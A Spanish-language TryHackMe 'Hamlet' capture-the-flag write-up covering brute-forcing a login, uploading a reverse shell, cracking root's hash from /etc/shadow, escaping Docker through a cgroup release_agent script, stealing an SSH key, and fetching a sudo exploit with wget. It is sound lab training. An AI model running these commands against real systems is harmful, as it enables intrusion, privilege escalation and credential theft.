@@ -1,0 +1,137 @@
+TryHackMe - Hamlet
+
+nmap:
+
+nmap -p 21,22,80,8000,8080 -sS -sC -sV -n -Pn 10.10.181.19 -oN nmap
+
+Results:
+
+21/tcp   open  ftp        vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rwxr-xr-x    1 0        0             113 Sep 15  2021 password-policy.md
+|_-rw-r--r--    1 0        0            1425 Sep 15  2021 ufw.status
+22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http       lighttpd 1.4.45
+8000/tcp open  http       Apache httpd 2.4.48 ((Debian))
+8080/tcp open  http-proxy
+
+Inside port 80, encontramos un servidor web con un texto que menciona un posible usuario "ghost" y un enlace a "/hamlet.txt" donde encontramos poesía de Hamlet. También, al probar con la ruta "/robotx.txt" revela la primera bandera:
+
+THM{************}
+
+Port 8000 contiene el archivo "hamlet.txt" y en el puerto 8080 hay un inicio de sesión.
+
+Para acceder al inicio de sesión, realizamos fuerza bruta con BurpSuite. Después de interceptar la solicitud, la enviamos a Intruder. Configuramos la carga útil con "password=aaaaaa", marcamos dónde ocurrirá el ataque de fuerza bruta y usamos sniper y una wordlist para el ataque.
+
+Usando las credenciales obtenidas:
+>ghost
+>vnsanctified
+
+Después de acceder al panel de administración, cargamos una reverse shell en el proyecto "hamlet" utilizando la reverse shell de Pentestmonkey. Para activarla, navegamos a la siguiente ruta:
+http://(VICTIM_IP):8080/repository/project/0/document/1/source/pentestmonkey443.php
+
+Después de configurar un listener con Netcat en el puerto 443, obtenemos acceso como "www-data". Al ejecutar "ls -la", vemos la presencia de ".dockerenv", indicando que estamos dentro de un contenedor Docker. Al investigar más, descubrimos que el comando "cat" se puede ejecutar con permisos de root. Nos dirigimos a la carpeta "/etc/shadow":
+
+cat /etc/shadow
+
+Se obtiene el hash de la contraseña de root:
+
+root:$y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4:18885:0:99999:7:::
+
+Crackeamos el hash con John the Ripper, revelando la contraseña "murder".
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt
+
+Iniciamos sesión como root:
+
+su root
+pass: murder
+
+Ahora, como root, encontramos la siguiente bandera:
+
+cat /root/flag
+THM{**********}
+
+Para escapar de Docker, seguimos los pasos descritos en la página web proporcionada.
+
+Escapando de Docker: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+
+Los comandos ejecutados fuera del contenedor Docker proporcionan la siguiente bandera:
+
+cat output
+THM{*********}
+
+Ahora, necesitamos acceder directamente al servidor SSH, buscando usuarios y el archivo id_rsa para ingresar vía SSH.
+
+Comandos:
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "ls -la /home/ > $host_path/output" >> /cmd
+chmod a+x /cmd
+sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
+
+Los usuarios encontrados son:
+- gravediggers
+- ophelia
+- ubuntu
+
+Buscando id_rsa:
+
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "locate /.ssh > $host_path/output" >> /cmd
+chmod a+x /cmd
+sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
+
+Se encuentra id_rsa en /home/ubuntu/.ssh/id_rsa.
+
+Accediendo al servidor SSH:
+
+nano id_rsa
+(Agregar el contenido de id_rsa obtenido)
+chmod 600 id_rsa
+ssh -i id_rsa ubuntu@10.10.21.221
+
+Dentro del servidor, la bandera en el directorio de ophelia es:
+
+cat /home/ophelia/flag
+THM{****************}
+
+Buscando otras banderas:
+
+find / -name flag 2>/dev/null
+/opt/stage/flag
+
+cat /opt/stage/flag
+THM{*********}
+
+Identificando una versión antigua de sudo:
+
+sudo -V
+Sudo version 1.8.21p2
+
+Explotando la versión antigua de sudo:
+
+Ir a /tmp, iniciar un servidor Python y descargar el exploit:
+
+python3 -m http.server 8080
+wget http://10.18.112.21:8080/exploit_nss.py
+python3 exploit_nss.py
+
+Ahora somos root.
+
+Revisando la bandera faltante:
+
+cat output
+THM{*************}
+
+Además, explorando el script "gravediggers.py" revela la última bandera:
+
+Flag2:
+THM{***********}
